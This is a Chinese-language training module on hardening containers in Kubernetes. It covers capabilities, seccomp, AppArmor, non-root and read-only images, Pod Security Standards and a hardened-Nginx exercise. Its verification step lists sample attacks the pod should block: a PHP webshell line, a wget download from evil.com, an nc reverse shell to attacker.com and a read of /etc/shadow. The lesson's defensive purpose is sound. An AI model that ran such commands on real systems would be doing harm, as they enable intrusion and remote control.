# 🧬 阶段二：容器安全与硬化

**目标**: 深入容器运行时安全机制，构建从Linux内核到Kubernetes的纵深防御体系。

> **🔄 技能迁移**: RASP（运行时应用自我保护）→ Container Runtime Security
> 
> 对于具有SDL背景的学习者：传统RASP通过agent监控应用运行时行为，容器安全则是在OS和内核层面实现类似的防护。理解Linux安全机制后，可以设计出更安全的容器运行环境。

> **💡 核心概念**:
> *   **Capabilities**: Linux将root权限细分为40+种能力，可以只给容器需要的最小权限
> *   **Seccomp**: 系统调用过滤器，限制容器可以调用哪些系统调用（类似应用层的API白名单）
> *   **AppArmor/SELinux**: 强制访问控制（MAC），限制进程可以访问的文件和资源
> *   **SecurityContext**: Kubernetes中配置Pod/Container安全属性的统一接口
> *   **Namespace/Cgroups**: 容器隔离的基石（进程隔离 + 资源限制）

---

## 📝 学习任务

### 第一部分：Linux安全基础（2小时）

#### 理解容器隔离原理

容器并不是虚拟机，它本质上是受限的Linux进程。理解这一点是容器安全的基础。

* [ ] **Namespace - 进程隔离**
  
  Linux Namespace提供了7种隔离维度：
  ```bash
  # 查看进程的namespace
  ls -la /proc/$$/ns/
  
  # 常见namespace类型：
  # - PID: 进程ID隔离
  # - NET: 网络栈隔离
  # - MNT: 文件系统挂载点隔离
  # - UTS: 主机名隔离
  # - IPC: 进程间通信隔离
  # - USER: 用户和组ID隔离
  # - CGROUP: cgroup根目录隔离
  ```
  
  **实战练习**：
  ```bash
  # 1. 创建一个简单Pod查看其namespace
  kubectl run test-ns --image=nginx
  
  # 2. 进入容器查看PID namespace
  kubectl exec -it test-ns -- bash
  ps aux  # 在容器内只能看到容器内进程
  
  # 3. 在宿主机上查看
  ps aux | grep nginx  # 可以看到容器进程，但PID不同
  ```

* [ ] **Cgroups - 资源限制**
  
  Cgroups控制容器可以使用多少资源（CPU、内存、IO等）
  ```bash
  # 在容器内查看cgroup限制
  kubectl exec -it test-ns -- cat /sys/fs/cgroup/memory/memory.limit_in_bytes
  
  # 设置资源限制
  kubectl run resource-test --image=nginx \
    --requests='cpu=100m,memory=128Mi' \
    --limits='cpu=200m,memory=256Mi'
  ```

#### Linux Capabilities深度理解

* [ ] **查看默认Capabilities**
  
  Docker默认给容器14个capabilities，这已经太多了！
  
  ```bash
  # 方式1：在容器内安装libcap2-bin
  kubectl run cap-test --image=ubuntu -- sleep infinity
  kubectl exec -it cap-test -- bash
  apt update && apt install -y libcap2-bin
  capsh --print
  
  # 方式2：使用特定镜像
  kubectl run cap-test2 --image=alpine -- sleep infinity
  kubectl exec -it cap-test2 -- sh
  apk add libcap
  capsh --print
  ```
  
  **默认Capabilities列表**：
  - `CAP_CHOWN` - 修改文件所有者
  - `CAP_DAC_OVERRIDE` - 绕过文件读写执行权限检查
  - `CAP_FOWNER` - 绕过文件所有者检查
  - `CAP_FSETID` - 设置文件的setuid/setgid位
  - `CAP_KILL` - 发送信号给其他进程
  - `CAP_SETGID` - 设置进程GID
  - `CAP_SETUID` - 设置进程UID
  - `CAP_NET_BIND_SERVICE` - 绑定小于1024的端口
  - `CAP_NET_RAW` - 使用RAW和PACKET socket
  - `CAP_SYS_CHROOT` - 使用chroot
  - `CAP_MKNOD` - 创建设备文件
  - `CAP_AUDIT_WRITE` - 写入审计日志
  - `CAP_SETFCAP` - 设置文件capabilities

* [ ] **Drop ALL Capabilities实验**
  
  ```yaml
  # drop-all-caps-pod.yaml
  apiVersion: v1
  kind: Pod
  metadata:
    name: no-caps
  spec:
    containers:
    - name: nginx
      image: nginx:alpine
      securityContext:
        capabilities:
          drop:
          - ALL
  ```
  
  ```bash
  kubectl apply -f drop-all-caps-pod.yaml
  kubectl exec -it no-caps -- sh
  
  # 尝试一些操作，观察权限被拒绝
  ping google.com  # 失败：需要CAP_NET_RAW
  ```

* [ ] **精细化Capabilities - 最小权限原则**
  
  ```yaml
  # nginx-minimal-caps.yaml
  apiVersion: v1
  kind: Pod
  metadata:
    name: nginx-minimal
  spec:
    containers:
    - name: nginx
      image: nginx:alpine
      ports:
      - containerPort: 80
      securityContext:
        capabilities:
          drop:
          - ALL
          add:
          - NET_BIND_SERVICE  # 只添加绑定80端口所需的能力
        runAsNonRoot: true
        runAsUser: 101  # nginx用户
  ```

---

### 第二部分：Seccomp/AppArmor/SELinux（3小时）

#### Seccomp - 系统调用过滤

Seccomp（Secure Computing Mode）是Linux内核的安全特性，可以限制进程能够调用的系统调用。

* [ ] **理解系统调用**
  
  应用程序通过系统调用与内核交互。Linux有300+个系统调用，但大多数应用只需要其中很少一部分。
  
  ```bash
  # 查看进程的系统调用
  kubectl run strace-test --image=alpine -- sleep 1000
  kubectl exec -it strace-test -- sh
  apk add strace
  
  # 跟踪ls命令的系统调用
  strace ls /
  
  # 常见系统调用：
  # - read/write: 读写文件
  # - open/close: 打开关闭文件
  # - socket/connect: 网络操作
  # - fork/exec: 进程操作
  # - 危险调用: reboot, swapon, mount
  ```

* [ ] **Kubernetes默认Seccomp Profile**
  
  Kubernetes 1.22+默认启用RuntimeDefault seccomp profile
  
  ```yaml
  # seccomp-default.yaml
  apiVersion: v1
  kind: Pod
  metadata:
    name: seccomp-default
  spec:
    securityContext:
      seccompProfile:
        type: RuntimeDefault
    containers:
    - name: test
      image: alpine
      command: ["sleep", "infinity"]
  ```
  
  ```bash
  kubectl apply -f seccomp-default.yaml
  kubectl exec -it seccomp-default -- sh
  
  # 尝试执行一些被拦截的系统调用
  # 大部分常规操作都可以，但一些危险操作会被拦截
  ```

* [ ] **自定义Seccomp Profile**
  
  ```json
  # audit-profile.json - 审计模式，记录但不拦截
  {
    "defaultAction": "SCMP_ACT_LOG"
  }
  ```
  
  ```json
  # strict-profile.json - 严格模式，只允许必要的系统调用
  {
    "defaultAction": "SCMP_ACT_ERRNO",
    "architectures": ["SCMP_ARCH_X86_64"],
    "syscalls": [
      {
        "names": [
          "accept4",
          "arch_prctl",
          "bind",
          "brk",
          "clone",
          "close",
          "connect",
          "epoll_create1",
          "epoll_ctl",
          "epoll_pwait",
          "exit_group",
          "fcntl",
          "fstat",
          "futex",
          "getcwd",
          "getpid",
          "getsockname",
          "getsockopt",
          "listen",
          "mmap",
          "mprotect",
          "munmap",
          "open",
          "openat",
          "read",
          "readv",
          "setsockopt",
          "socket",
          "write",
          "writev"
        ],
        "action": "SCMP_ACT_ALLOW"
      }
    ]
  }
  ```

#### AppArmor - 强制访问控制

* [ ] **检查AppArmor支持**
  
  ```bash
  # 在节点上检查AppArmor
  cat /sys/module/apparmor/parameters/enabled  # 应该输出Y
  
  # 查看已加载的profile
  sudo aa-status
  ```

* [ ] **使用预定义Profile**
  
  ```yaml
  # apparmor-pod.yaml
  apiVersion: v1
  kind: Pod
  metadata:
    name: apparmor-test
    annotations:
      container.apparmor.security.beta.kubernetes.io/test: runtime/default
  spec:
    containers:
    - name: test
      image: nginx:alpine
  ```

* [ ] **自定义AppArmor Profile（进阶）**
  
  ```bash
  # 在节点上创建profile
  sudo vi /etc/apparmor.d/k8s-nginx
  ```
  
  ```
  #include <tunables/global>
  
  profile k8s-nginx flags=(attach_disconnected) {
    #include <abstractions/base>
    
    # 允许网络
    network inet tcp,
    network inet udp,
    
    # 允许读取nginx配置
    /etc/nginx/** r,
    /var/log/nginx/** w,
    /var/run/nginx.pid w,
    
    # 拒绝其他所有写操作
    deny /** w,
  }
  ```

---

### 第三部分：容器运行时安全（2小时）

#### RunAsNonRoot - 永不以root运行

**原则**: 容器内的root = 宿主机的root（在没有user namespace的情况下）

* [ ] **理解风险**
  
  ```bash
  # 创建一个以root运行的容器
  kubectl run root-pod --image=nginx
  kubectl exec -it root-pod -- id
  # uid=0(root) gid=0(root)
  
  # 如果容器逃逸，攻击者就拥有了宿主机root权限！
  ```

* [ ] **强制NonRoot**
  
  ```yaml
  # nonroot-pod.yaml
  apiVersion: v1
  kind: Pod
  metadata:
    name: nonroot-nginx
  spec:
    securityContext:
      runAsNonRoot: true
      runAsUser: 1000
      runAsGroup: 3000
      fsGroup: 2000
    containers:
    - name: nginx
      image: nginx:alpine
  ```
  
  ```bash
  kubectl apply -f nonroot-pod.yaml
  # 这会失败，因为nginx镜像默认以root启动
  
  # 需要修改Dockerfile或使用非root镜像
  ```

* [ ] **创建NonRoot镜像**
  
  ```dockerfile
  # Dockerfile.nginx-nonroot
  FROM nginx:alpine
  
  # 创建非root用户
  RUN addgroup -g 101 -S nginx && \
      adduser -S -D -H -u 101 -h /var/cache/nginx -s /sbin/nologin -G nginx nginx
  
  # 修改文件权限
  RUN chown -R nginx:nginx /var/cache/nginx && \
      chown -R nginx:nginx /var/log/nginx && \
      chown -R nginx:nginx /etc/nginx/conf.d
  RUN touch /var/run/nginx.pid && \
      chown -R nginx:nginx /var/run/nginx.pid
  
  # 使用非特权端口
  RUN sed -i 's/listen\s*80;/listen 8080;/' /etc/nginx/conf.d/default.conf
  RUN sed -i 's/listen\s*\[::\]:80;/listen [::]:8080;/' /etc/nginx/conf.d/default.conf
  
  # 切换用户
  USER nginx
  
  EXPOSE 8080
  ```

#### ReadOnly Root Filesystem

* [ ] **只读根文件系统**
  
  防止攻击者在容器内写入恶意文件
  
  ```yaml
  # readonly-root.yaml
  apiVersion: v1
  kind: Pod
  metadata:
    name: readonly-nginx
  spec:
    containers:
    - name: nginx
      image: nginx:alpine
      securityContext:
        readOnlyRootFilesystem: true
      volumeMounts:
      - name: cache
        mountPath: /var/cache/nginx
      - name: run
        mountPath: /var/run
    volumes:
    - name: cache
      emptyDir: {}
    - name: run
      emptyDir: {}
  ```

#### 其他安全选项

* [ ] **禁止特权升级**
  
  ```yaml
  securityContext:
    allowPrivilegeEscalation: false
  ```

* [ ] **禁止特权模式**
  
  ```yaml
  securityContext:
    privileged: false  # 默认值，但最好显式声明
  ```

---

### 第四部分：SecurityContext最佳实践（2小时）

#### Pod Security Standards

Kubernetes 1.25+用Pod Security Standards替代了已废弃的PodSecurityPolicy

三个级别：
- **Privileged**: 无限制（不推荐）
- **Baseline**: 最小限制，防止已知权限提升
- **Restricted**: 严格限制，遵循安全最佳实践

* [ ] **应用Baseline标准**
  
  ```yaml
  # baseline-namespace.yaml
  apiVersion: v1
  kind: Namespace
  metadata:
    name: baseline-ns
    labels:
      pod-security.kubernetes.io/enforce: baseline
      pod-security.kubernetes.io/audit: baseline
      pod-security.kubernetes.io/warn: baseline
  ```

* [ ] **应用Restricted标准**
  
  ```yaml
  # restricted-namespace.yaml
  apiVersion: v1
  kind: Namespace
  metadata:
    name: restricted-ns
    labels:
      pod-security.kubernetes.io/enforce: restricted
      pod-security.kubernetes.io/audit: restricted
      pod-security.kubernetes.io/warn: restricted
  ```

#### 企业级安全基线模板

* [ ] **完整的SecurityContext示例**
  
  ```yaml
  # secure-pod-template.yaml
  apiVersion: v1
  kind: Pod
  metadata:
    name: ultra-secure-app
    namespace: restricted-ns
  spec:
    # Pod级别安全设置
    securityContext:
      runAsNonRoot: true
      runAsUser: 1000
      runAsGroup: 3000
      fsGroup: 2000
      seccompProfile:
        type: RuntimeDefault
    
    containers:
    - name: app
      image: myapp:1.0
      
      # Container级别安全设置
      securityContext:
        allowPrivilegeEscalation: false
        readOnlyRootFilesystem: true
        runAsNonRoot: true
        runAsUser: 1000
        capabilities:
          drop:
          - ALL
      
      # 资源限制
      resources:
        requests:
          cpu: 100m
          memory: 128Mi
        limits:
          cpu: 200m
          memory: 256Mi
      
      # 只读根文件系统需要临时目录
      volumeMounts:
      - name: tmp
        mountPath: /tmp
      - name: cache
        mountPath: /app/cache
    
    volumes:
    - name: tmp
      emptyDir: {}
    - name: cache
      emptyDir: {}
  ```

---

## 🏆 里程碑练习：铁桶阵

**任务**: 部署一个极致硬化的Nginx容器，能够正常提供服务，但攻击者无法在其中执行恶意操作。

### 要求清单

1. ✅ **Drop ALL Capabilities**，只添加必要的`NET_BIND_SERVICE`（如果使用80端口）
2. ✅ **ReadOnly Root Filesystem**，只允许写入必要的临时目录
3. ✅ **RunAsNonRoot**，使用UID 101运行
4. ✅ **Seccomp RuntimeDefault**
5. ✅ **禁止特权升级**
6. ✅ **资源限制**
7. ✅ **符合Restricted Pod Security Standard**

### 实施步骤

#### Step 1: 准备非root Nginx镜像

```dockerfile
# Dockerfile
FROM nginx:1.25-alpine

# 创建nginx用户（如果不存在）
RUN addgroup -g 101 -S nginx 2>/dev/null || true && \
    adduser -S -D -H -u 101 -h /var/cache/nginx -s /sbin/nologin -G nginx nginx 2>/dev/null || true

# 修改nginx配置使用8080端口（非特权端口）
RUN sed -i 's/listen\s*80;/listen 8080;/' /etc/nginx/conf.d/default.conf && \
    sed -i 's/listen\s*\[::\]:80;/listen [::]:8080;/' /etc/nginx/conf.d/default.conf

# 修改PID文件位置
RUN mkdir -p /var/cache/nginx /var/run && \
    chown -R nginx:nginx /var/cache/nginx /var/log/nginx /etc/nginx /var/run

# 修改nginx.conf，使用临时目录
RUN sed -i '/^http {/a \    client_body_temp_path /var/cache/nginx/client_temp;\n    proxy_temp_path /var/cache/nginx/proxy_temp;\n    fastcgi_temp_path /var/cache/nginx/fastcgi_temp;\n    uwsgi_temp_path /var/cache/nginx/uwsgi_temp;\n    scgi_temp_path /var/cache/nginx/scgi_temp;' /etc/nginx/nginx.conf

USER nginx

EXPOSE 8080
```

```bash
# 构建镜像
docker build -t nginx-hardened:1.0 .
# 如果使用minikube
minikube image load nginx-hardened:1.0
```

#### Step 2: 部署硬化Pod

```yaml
# hardened-nginx.yaml
apiVersion: v1
kind: Pod
metadata:
  name: hardened-nginx
  labels:
    app: hardened-nginx
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 101
    runAsGroup: 101
    fsGroup: 101
    seccompProfile:
      type: RuntimeDefault
  
  containers:
  - name: nginx
    image: nginx-hardened:1.0
    
    ports:
    - containerPort: 8080
      protocol: TCP
    
    securityContext:
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
      runAsNonRoot: true
      runAsUser: 101
      capabilities:
        drop:
        - ALL
    
    resources:
      requests:
        cpu: 50m
        memory: 64Mi
      limits:
        cpu: 100m
        memory: 128Mi
    
    volumeMounts:
    - name: cache
      mountPath: /var/cache/nginx
    - name: run
      mountPath: /var/run
  
  volumes:
  - name: cache
    emptyDir: {}
  - name: run
    emptyDir: {}
---
apiVersion: v1
kind: Service
metadata:
  name: hardened-nginx
spec:
  selector:
    app: hardened-nginx
  ports:
  - port: 80
    targetPort: 8080
  type: NodePort
```

```bash
kubectl apply -f hardened-nginx.yaml
```

#### Step 3: 验证服务正常运行

```bash
# 检查Pod状态
kubectl get pod hardened-nginx
kubectl describe pod hardened-nginx

# 测试HTTP访问
kubectl port-forward pod/hardened-nginx 8080:8080
curl http://localhost:8080

# 或通过Service访问
kubectl get svc hardened-nginx
curl http://<node-ip>:<node-port>
```

#### Step 4: 验证安全加固

```bash
# 进入容器
kubectl exec -it hardened-nginx -- sh

# ❌ 尝试安装软件（应该失败）
apk update
# Error: Read-only file system

# ❌ 尝试修改系统文件（应该失败）
echo "hacked" > /etc/hosts
# sh: can't create /etc/hosts: Read-only file system

# ❌ 尝试创建文件（应该失败）
touch /tmp/test
# touch: /tmp/test: Read-only file system

# ✅ 只能在允许的目录写入
touch /var/cache/nginx/test
ls -la /var/cache/nginx/test

# 检查运行用户
id
# uid=101(nginx) gid=101(nginx)

# 检查capabilities
apk add libcap
capsh --print
# Current: =
# （空白表示没有任何capabilities）
```

#### Step 5: 渗透测试

```bash
# 尝试常见攻击向量

# 1. 尝试写入webshell
kubectl exec -it hardened-nginx -- sh
echo '<?php system($_GET["cmd"]); ?>' > /usr/share/nginx/html/shell.php
# 失败：Read-only file system

# 2. 尝试修改nginx配置
echo "malicious config" > /etc/nginx/nginx.conf
# 失败：Read-only file system

# 3. 尝试下载工具
wget http://evil.com/backdoor
# 失败：wget可能不存在，且即使存在也无法写入

# 4. 尝试反弹shell
nc -e /bin/sh attacker.com 4444
# 失败：nc可能不存在，且受seccomp限制

# 5. 检查敏感文件
cat /etc/shadow
# 失败：权限不足（非root）
```

### ✅ 通关标准

1. ✅ **功能正常**: Nginx能够正常响应HTTP请求
2. ✅ **无特权运行**: `id`命令显示uid=101，非root
3. ✅ **文件系统只读**: 无法在根文件系统创建/修改文件
4. ✅ **无Capabilities**: `capsh --print`显示为空
5. ✅ **安装软件失败**: `apk update`等命令失败
6. ✅ **修改配置失败**: 无法修改/etc下的任何文件
7. ✅ **符合Restricted标准**: Pod能在restricted namespace中运行

---

## 📚 扩展学习

### 深入理解底层原理

1. **《Container Security》** - Liz Rice
   - 第3-5章：Namespace, Cgroups, Capabilities详解
   
2. **Linux内核文档**
   - [Capabilities man page](https://man7.org/linux/man-pages/man7/capabilities.7.html)
   - [Seccomp documentation](https://www.kernel.org/doc/Documentation/prctl/seccomp_filter.txt)

3. **Kubernetes官方文档**
   - [Pod Security Standards](https://kubernetes.io/docs/concepts/security/pod-security-standards/)
   - [SecurityContext](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)

### 开源项目实践

1. **分析Docker源码**
   - `github.com/moby/moby` - 查看Seccomp profile实现
   - `runc` - 容器运行时实现

2. **贡献OPA Gatekeeper**
   - 编写SecurityContext检查策略
   - 贡献到 `github.com/open-policy-agent/gatekeeper-library`

3. **开发Kubectl插件**
   - 创建一个插件扫描集群中的不安全Pod
   - 检查是否有特权容器、root运行等

---

## 🤔 学习验证清单

完成本阶段后，应该能够回答：

- [ ] Namespace和Cgroups分别解决什么问题？
- [ ] Linux Capabilities有哪些？默认给容器哪些？
- [ ] Seccomp是什么？RuntimeDefault profile做了什么？
- [ ] AppArmor和SELinux有什么区别？
- [ ] 为什么要RunAsNonRoot？风险是什么？
- [ ] ReadOnlyRootFilesystem如何配置？需要注意什么？
- [ ] Pod Security Standards三个级别的区别？
- [ ] SecurityContext在Pod级别和Container级别有什么不同？
- [ ] 如何为企业制定容器安全基线？
- [ ] 容器逃逸的常见手法有哪些？如何防御？

---

## 🔗 与SDL的关联

| SDL实践 | 容器安全对应 | 说明 |
|---------|------------|------|
| 最小权限原则 | Drop ALL Capabilities | 只给必要的权限 |
| 纵深防御 | SecurityContext多层配置 | Capabilities + Seccomp + AppArmor |
| 运行时保护(RASP) | ReadOnlyRootFilesystem | 防止运行时被篡改 |
| 安全基线 | Pod Security Standards | 强制执行安全配置 |
| 威胁建模 | 容器逃逸场景分析 | 理解攻击面 |

---

*在此目录下创建 `solutions.md` 保存练习代码和截图，创建 `notes.md` 记录学习笔记和问题。*
